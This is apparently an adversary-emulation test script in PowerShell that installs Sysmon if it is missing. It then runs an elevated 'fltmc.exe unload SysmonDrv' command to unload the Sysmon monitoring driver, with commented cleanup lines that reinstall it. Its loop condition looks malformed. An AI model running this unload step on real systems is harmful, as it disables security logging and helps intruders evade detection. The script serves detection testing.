#Atomic Test #10 - Unload Sysmon Filter Driver

#CHECK IF INSTALLED
function CheckSysmonInstalled {
    if(sc.exe query sysmon | findstr sysmon) { 
        # return 0 
        return $true 
    } else{ 
        if(cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") { 
            C:\Windows\Sysmon64.exe -accepteula -i 
        } else{ 
            Set-Location $env:TEMP\Sysmon\; .\Sysmon.exe -accepteula -i
        }
        #return 1 
        return $false
    }
}
#Check if Sysmon is Loaded
function CheckSysmonLoaded {
    if(fltmc.exe filters | findstr 	SysmonDrv) { 
        return $true 
        # exit 0 
    } else{ 
        Start-Process -Filepath PowerShell  -Verb runAs -ArgumentList '/c  "sysmon.exe -u"'
        Start-Process -Filepath PowerShell  -Verb runAs -ArgumentList '/c  "sysmon.exe -accepteula -i"'
        return $false 
    }
}

#check if file exist
function CheckSysmonExist {
    if ((cmd.exe /c "where.exe Sysmon.exe 2> nul | findstr Sysmon 2> nul") -or (Test-Path $env:Temp\Sysmon\Sysmon.exe)) {
        # return 0 
        return $true 
    } else{ 
        Invoke-WebRequest "https://download.sysinternals.com/files/Sysmon.zip" -OutFile "$env:TEMP\Sysmon.zip"
        Expand-Archive $env:TEMP\Sysmon.zip $env:TEMP\Sysmon -Force
        Remove-Item $env:TEMP\Sysmon.zip -Force
        # return 1 
        return $false
    }
}

while ((CheckSysmonExist -is $false) -and (CheckSysmonInstalled -is $false ) -and (CheckSysmonLoaded -is $false) ) {
    CheckSysmonExist
    CheckSysmonInstalled
    CheckSysmonLoaded
}
Start-Process -Filepath cmd.exe  -Verb runAs -ArgumentList '/c  "fltmc.exe unload SysmonDrv"'

#Cleanup Commands:
# sysmon -u -i > nul 2>&1
# sysmon -i -accepteula -i > nul 2>&1
# %temp%\Sysmon\sysmon.exe -u > nul 2>&1
# %temp%\Sysmon\sysmon.exe -accepteula -i > nul 2>&1